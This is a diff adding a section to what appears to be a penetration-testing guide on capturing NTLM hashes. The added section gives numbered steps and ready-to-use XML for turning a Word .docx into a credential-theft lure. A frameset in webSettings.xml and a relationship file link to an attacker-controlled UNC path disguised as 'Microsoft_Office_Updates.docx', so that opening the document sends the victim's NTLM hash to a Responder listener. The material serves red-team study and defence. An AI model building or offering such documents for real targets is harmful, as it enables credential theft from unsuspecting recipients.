@@ -88,3 +88,47 @@ NOTE: `the user only needs to download the image once. As the POC shows, once th
 Though: can this be uses as a [DOS attack](https://www.kb.cert.org/vuls/id/867968/)?
 
 
+## 3. Word (frameset)
+
+> Historically Microsoft Word was used as an HTML editor. This means that it can support HTML elements such as framesets. It is therefore possible to link a Microsoft Word document with a UNC path and combing this with responder in order to capture NTLM hashes externally.
+
+### Setup (more complicated)
+
+1. Create a word document
+2. Write anything into the document
+3. Save Document
+4. Right click on document -> Open archive
+5. Edit \file.docx\word\webSettings.xml
+6. Add the following to the file between `<w:optimizeForBrowser/>` xml tag
+
+````
+<w:frameset>
+<w:framesetSplitbar>
+<w:w w:val="60"/>
+<w:color w:val="auto"/>
+<w:noBorder/>
+</w:framesetSplitbar>
+<w:frameset>
+<w:frame>
+<w:name w:val="3"/>
+<w:sourceFileName r:id="rId1"/>
+<w:linkedToFile/>
+</w:frame>
+</w:frameset>
+</w:frameset>
+````
+
+7. Create file \file.docx\word\_rels\webSettings.xml.rels
+
+````
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships
+xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="\\IP\Microsoft_Office_Updates.docx" TargetMode="External"/>
+</Relationships>
+````
+8. DONE!!!
+
+![](word_capture_hash.gif)
+
+More information on [Framesets](https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/)
